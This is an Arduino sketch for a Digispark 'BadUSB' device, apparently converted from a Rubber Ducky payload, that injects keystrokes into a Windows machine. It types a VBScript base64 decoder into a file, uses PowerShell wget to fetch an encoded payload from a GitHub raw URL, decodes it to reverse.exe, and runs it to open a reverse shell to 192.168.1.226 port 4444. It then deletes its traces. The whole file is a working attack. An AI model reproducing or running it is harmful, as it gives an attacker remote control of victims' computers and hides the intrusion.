// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(41);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  // DELAY 400
  // MENU
  // DELAY 400
  // STRING a
  // DELAY 600
  // LEFTARROW
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("copy /Y con decoder.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)");
  DigiKeyboard.print(":outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = ");
  DigiKeyboard.print("CreateObject(\"Scripting.FileSystemObject\"):");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = ");
  DigiKeyboard.print("objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function ");
  DigiKeyboard.print("decodeBase64(base64):");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("dim DM, EL:Set DM = CreateObject(\"Microsoft.XMLDOM\"):Set EL = DM.createElement(\"tmp\"):");
  DigiKeyboard.print("EL.DataType = \"bin.base64\":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub ");
  DigiKeyboard.print("writeBytes(file, bytes):Dim binaryStream:");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Set binaryStream = CreateObject(\"ADODB.Stream\"):binaryStream.Type = 1:");
  DigiKeyboard.print("binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell"); // TYPE BAD BASE64
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("wget 'https://raw.githubusercontent.com/doitranch/special-files/main/hypotheticalbase64.txt' -OutFile reverse.txt"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cscript decoder.vbs reverse.txt reverse.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("reverse.exe 192.168.1.226 4444");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.print("del /q decoder.vbs && del /q reverse.txt"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  for (;;)
  {}
}
